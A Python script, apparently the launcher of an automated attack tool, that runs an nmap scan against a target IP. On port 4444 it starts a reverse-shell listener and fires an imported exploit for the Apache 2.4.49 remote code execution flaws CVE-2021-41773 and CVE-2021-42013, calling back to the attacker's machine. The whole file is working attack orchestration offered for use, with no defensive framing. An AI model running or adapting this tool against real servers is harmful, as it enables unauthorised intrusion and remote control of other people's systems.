import argparse
import socket
from time import sleep
import recon
import socket
from multiprocessing import Process
import rs_client
import sys
import plugins.initial_access.plugin_initial_access_apache2_4_49_RCE as plugin_initial_access_apache2_4_49_RCE


def listener():
    sys.stdin = open(0)
    rs_client.main(LOCAL_PORT, LOCAL_ADDRESS)

def exploit():
    sleep(3)
    try:
        print('[+] Running exploit')
        res = plugin_initial_access_apache2_4_49_RCE.exploit(args.target_ip, i['port'], LOCAL_ADDRESS, LOCAL_PORT)
        if res is True:
            print('[+] Exploit was successful !')
    except Exception as e:
        print(e)

def extract_ip():
    st = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:       
        st.connect(('10.255.255.255', 1))
        IP = st.getsockname()[0]
    except Exception as e:
        print(e)
        sys.exit()
    finally:
        st.close()
    return IP

if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    parser.add_argument('-t', '--target_ip', type=str, help='ip to target', required=True)
    parser.add_argument('-l', '--local_ip', type=str, help='local ip', required=False)
    args = parser.parse_args()
    if args.local_ip == None:
        LOCAL_ADDRESS = extract_ip()
    else:
        LOCAL_ADDRESS = args.local_ip
    res_recon = recon.nmap_scan(args.target_ip)

    LOCAL_PORT = 9001
    BUFFER_SIZE = 1024 * 128
    SEPARATOR = '<sep>'

    for i in res_recon:
        print('[+] Attacking port {}'.format(i['port']))
        if i['port'] == '4444':
            print('[+] Attempting to gain access with CVE-2021-41773 or CVE-2021-42013...')
            listener_process = Process(target=listener)
            listener_process.start()
            exploit_process = Process(target=exploit)
            exploit_process.start()
            listener_process.join()
            exploit_process.join()
        else:
            print('[-] No exploit available for this port')
